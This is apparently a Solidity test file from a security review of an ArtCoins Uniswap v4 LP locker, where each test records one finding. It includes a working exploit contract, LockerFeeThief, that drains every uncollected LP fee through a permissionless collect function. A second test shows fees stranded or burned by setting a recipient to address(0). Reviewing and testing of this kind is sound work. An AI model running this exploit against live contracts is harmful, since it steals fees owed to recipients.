// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test, console2} from "forge-std/Test.sol";

import {ArtCoinsFeeEscrow} from "../../../../src/ArtCoinsFeeEscrow.sol";
import {IArtCoinsFactory} from "../../../../src/interfaces/IArtCoinsFactory.sol";
import {IArtCoinsLpLocker} from "../../../../src/interfaces/IArtCoinsLpLocker.sol";
import {ArtCoinsLpLocker} from "../../../../src/lp-lockers/ArtCoinsLpLocker.sol";

import {IAllowanceTransfer} from "@uniswap/permit2/src/interfaces/IAllowanceTransfer.sol";
import {PoolManager} from "@uniswap/v4-core/src/PoolManager.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "@uniswap/v4-core/src/interfaces/callback/IUnlockCallback.sol";
import {FixedPoint128} from "@uniswap/v4-core/src/libraries/FixedPoint128.sol";
import {FullMath} from "@uniswap/v4-core/src/libraries/FullMath.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {PoolSwapTest} from "@uniswap/v4-core/src/test/PoolSwapTest.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {PoolId, PoolIdLibrary} from "@uniswap/v4-core/src/types/PoolId.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {PositionManager} from "@uniswap/v4-periphery/src/PositionManager.sol";
import {IPositionDescriptor} from "@uniswap/v4-periphery/src/interfaces/IPositionDescriptor.sol";
import {IWETH9} from "@uniswap/v4-periphery/src/interfaces/external/IWETH9.sol";
import {Actions} from "@uniswap/v4-periphery/src/libraries/Actions.sol";

import {Permit2Stub, ReviewToken} from "./LockerFeesStubs.sol";

/// @notice attacker for LF-01. runs inside its own PoolManager unlock:
///         1. makes the shared PositionManager owe the pool (TAKE with no credit),
///         2. calls the permissionless `collectRewardsWithoutUnlock`, whose
///            DECREASE credits the locker's fees to PositionManager and whose
///            TAKE_PAIR (full credit) now nets to zero.
contract LockerFeeThief is IUnlockCallback {
    IPoolManager public immutable pm;
    PositionManager public immutable posm;
    ArtCoinsLpLocker public immutable locker;

    PoolKey internal key;
    address internal coin;
    uint256 internal take0;
    uint256 internal take1;

    constructor(IPoolManager pm_, PositionManager posm_, ArtCoinsLpLocker locker_) {
        pm = pm_;
        posm = posm_;
        locker = locker_;
    }

    function attack(PoolKey memory key_, address coin_, uint256 t0, uint256 t1) external {
        key = key_;
        coin = coin_;
        take0 = t0;
        take1 = t1;
        pm.unlock("");
    }

    function unlockCallback(bytes calldata) external returns (bytes memory) {
        require(msg.sender == address(pm), "not pm");
        bytes memory actions = abi.encodePacked(uint8(Actions.TAKE), uint8(Actions.TAKE));
        bytes[] memory params = new bytes[](2);
        params[0] = abi.encode(key.currency0, address(this), take0);
        params[1] = abi.encode(key.currency1, address(this), take1);
        // PositionManager.TAKE with an explicit amount is not checked against any credit
        posm.modifyLiquiditiesWithoutUnlock(actions, params);
        // permissionless; repays PositionManager's debt out of the locker's fees
        locker.collectRewardsWithoutUnlock(coin);
        return "";
    }

    receive() external payable {}
}

contract LpLockerReviewTest is Test {
    using PoolIdLibrary for PoolKey;
    using StateLibrary for IPoolManager;

    int24 internal constant TICK_IF_TOKEN0 = -138_200; // ~1e6 coin per eth
    uint256 internal constant SUPPLY = 100_000_000e18;

    PoolManager internal pm;
    PositionManager internal posm;
    Permit2Stub internal p2;
    ArtCoinsFeeEscrow internal escrow;
    ArtCoinsLpLocker internal locker;
    ReviewToken internal coin;
    PoolSwapTest internal swapper;
    PoolKey internal key;

    address internal owner = makeAddr("owner");
    address internal adminA = makeAddr("adminA");
    address internal adminB = makeAddr("adminB");
    address internal recipA = makeAddr("recipA");
    address internal recipB = makeAddr("recipB");
    address internal keeper = makeAddr("keeper");

    function setUp() public {
        pm = new PoolManager(address(this));
        p2 = new Permit2Stub();
        posm = new PositionManager(
            IPoolManager(address(pm)),
            IAllowanceTransfer(address(p2)),
            0,
            IPositionDescriptor(address(0)),
            IWETH9(address(0))
        );
        escrow = new ArtCoinsFeeEscrow(owner);
        // this test contract plays the factory
        locker = new ArtCoinsLpLocker(owner, address(this), address(escrow), address(posm), address(p2));
        vm.prank(owner);
        escrow.addDepositor(address(locker));

        coin = new ReviewToken("COIN");
        // native eth pool: eth is currency0, the coin is currency1
        key = PoolKey({
            currency0: Currency.wrap(address(0)),
            currency1: Currency.wrap(address(coin)),
            fee: 10_000,
            tickSpacing: 200,
            hooks: IHooks(address(0))
        });
        pm.initialize(key, TickMath.getSqrtPriceAtTick(-TICK_IF_TOKEN0));

        IArtCoinsFactory.LockerConfig memory lc;
        lc.locker = address(locker);
        lc.rewardAdmins = new address[](2);
        lc.rewardAdmins[0] = adminA;
        lc.rewardAdmins[1] = adminB;
        lc.rewardRecipients = new address[](2);
        lc.rewardRecipients[0] = recipA;
        lc.rewardRecipients[1] = recipB;
        lc.rewardBps = new uint16[](2);
        lc.rewardBps[0] = 8000;
        lc.rewardBps[1] = 2000;
        lc.tickLower = new int24[](1);
        lc.tickLower[0] = TICK_IF_TOKEN0;
        lc.tickUpper = new int24[](1);
        lc.tickUpper[0] = 0;
        lc.positionBps = new uint16[](1);
        lc.positionBps[0] = 10_000;

        IArtCoinsFactory.PoolConfig memory pc = IArtCoinsFactory.PoolConfig({
            hook: address(0),
            pairedToken: address(0),
            tickIfToken0IsArtCoins: TICK_IF_TOKEN0,
            tickSpacing: 200,
            poolData: ""
        });

        coin.mint(address(this), SUPPLY);
        coin.approve(address(locker), SUPPLY);
        locker.placeLiquidity(lc, pc, key, SUPPLY, address(coin));

        swapper = new PoolSwapTest(IPoolManager(address(pm)));
        coin.approve(address(swapper), type(uint256).max);
    }

    receive() external payable {}

    function _trade() internal {
        vm.deal(address(this), 20 ether);
        // buy coin with 10 eth (eth side fee), then sell half of it back (coin side fee)
        uint256 coinBefore = coin.balanceOf(address(this));
        swapper.swap{value: 10 ether}(
            key,
            IPoolManager.SwapParams({
                zeroForOne: true,
                amountSpecified: -10 ether,
                sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1
            }),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ""
        );
        uint256 bought = coin.balanceOf(address(this)) - coinBefore;
        swapper.swap(
            key,
            IPoolManager.SwapParams({
                zeroForOne: false,
                amountSpecified: -int256(bought / 2),
                sqrtPriceLimitX96: TickMath.MAX_SQRT_PRICE - 1
            }),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ""
        );
    }

    /// @dev uncollected fees of the locker's single position, read the way an
    ///      attacker would (StateLibrary over extsload, no privileged access).
    function _pendingFees() internal view returns (uint256 f0, uint256 f1) {
        uint256 tokenId = locker.tokenRewards(address(coin)).positionId;
        PoolId id = key.toId();
        // coin is token1, so the configured [-138200, 0] range is flipped to [0, 138200]
        int24 lo = 0;
        int24 hi = -TICK_IF_TOKEN0;
        (uint128 liq, uint256 last0, uint256 last1) =
            IPoolManager(address(pm)).getPositionInfo(id, address(posm), lo, hi, bytes32(tokenId));
        (uint256 g0, uint256 g1) = IPoolManager(address(pm)).getFeeGrowthInside(id, lo, hi);
        unchecked {
            f0 = FullMath.mulDiv(g0 - last0, liq, FixedPoint128.Q128);
            f1 = FullMath.mulDiv(g1 - last1, liq, FixedPoint128.Q128);
        }
    }

    /// LF-01: anyone holding a PoolManager unlock can take every coin's accrued,
    /// uncollected LP fees (both currencies) through `collectRewardsWithoutUnlock`.
    function test_bug_LF01_collectRewardsWithoutUnlock_lets_anyone_steal_all_lp_fees() public {
        _trade();
        (uint256 f0, uint256 f1) = _pendingFees();
        assertGt(f0, 0, "eth fees accrued");
        assertGt(f1, 0, "coin fees accrued");

        // reference: what an honest collect would deliver (keeper + 2 recipients)
        uint256 snap = vm.snapshotState();
        vm.prank(keeper);
        locker.collectRewards(address(coin));
        uint256 honest0 = escrow.feesToClaim(recipA, address(0))
            + escrow.feesToClaim(recipB, address(0)) + keeper.balance;
        uint256 honest1 =
            escrow.feesToClaim(recipA, address(coin)) + escrow.feesToClaim(recipB, address(coin));
        vm.revertToState(snap);
        assertEq(honest0, f0, "on-chain fee read matches honest collect (eth)");
        assertEq(honest1, f1, "on-chain fee read matches honest collect (coin)");

        LockerFeeThief thief =
            new LockerFeeThief(IPoolManager(address(pm)), posm, locker);
        address attacker = makeAddr("attacker");
        vm.prank(attacker);
        thief.attack(key, address(coin), f0, f1);

        // attacker contract holds 100% of the fees in both currencies
        assertEq(address(thief).balance, f0, "thief got all eth fees");
        assertEq(coin.balanceOf(address(thief)), f1, "thief got all coin fees");
        // recipients got nothing and nothing is left to collect
        assertEq(escrow.feesToClaim(recipA, address(0)), 0);
        assertEq(escrow.feesToClaim(recipB, address(0)), 0);
        assertEq(escrow.feesToClaim(recipA, address(coin)), 0);
        (uint256 r0, uint256 r1) = _pendingFees();
        assertEq(r0 + r1, 0, "position fees zeroed");
        locker.collectRewards(address(coin));
        assertEq(escrow.feesToClaim(recipA, address(0)), 0, "later honest collect gets 0");
        console2.log("stolen eth fees (wei)", f0);
        console2.log("stolen coin fees", f1);
    }

    /// LF-05: slot admins can repoint recipients after launch (not frozen),
    /// including to address(0), which strands erc20 fees in the escrow and
    /// burns native eth fees.
    function test_bug_LF05_recipient_mutable_post_launch_and_zero_recipient_strands_fees() public {
        // admin rotation works at any time, no owner or timelock involved
        vm.prank(adminA);
        locker.updateRewardRecipient(address(coin), 0, makeAddr("newRecipient"));
        assertEq(locker.tokenRewards(address(coin)).rewardRecipients[0], makeAddr("newRecipient"));

        // no zero check on the update path (placeLiquidity has one)
        vm.prank(adminB);
        locker.updateRewardRecipient(address(coin), 1, address(0));
        _trade();
        locker.collectRewards(address(coin));
        uint256 strandedCoin = escrow.feesToClaim(address(0), address(coin));
        uint256 strandedEth = escrow.feesToClaim(address(0), address(0));
        assertGt(strandedCoin, 0);
        assertGt(strandedEth, 0);
        // erc20 credit to address(0) can never be claimed (OZ rejects transfer to 0)
        vm.expectRevert();
        escrow.claim(address(0), address(coin));
        // native credit "claims" by sending eth to address(0): burned
        uint256 zeroBefore = address(0).balance;
        escrow.claim(address(0), address(0));
        assertEq(address(0).balance - zeroBefore, strandedEth);
    }

    /// LF-06 (claim that holds, recorded): the locker owner cannot pull the LP
    /// position NFTs; `withdrawERC20(positionManager)` reverts because the
    /// position manager has no erc20 `transfer`.
    function test_holds_LF06_owner_cannot_withdraw_position_nft() public {
        vm.prank(owner);
        vm.expectRevert();
        locker.withdrawERC20(address(posm), owner);
        assertEq(posm.ownerOf(locker.tokenRewards(address(coin)).positionId), address(locker));
    }
}
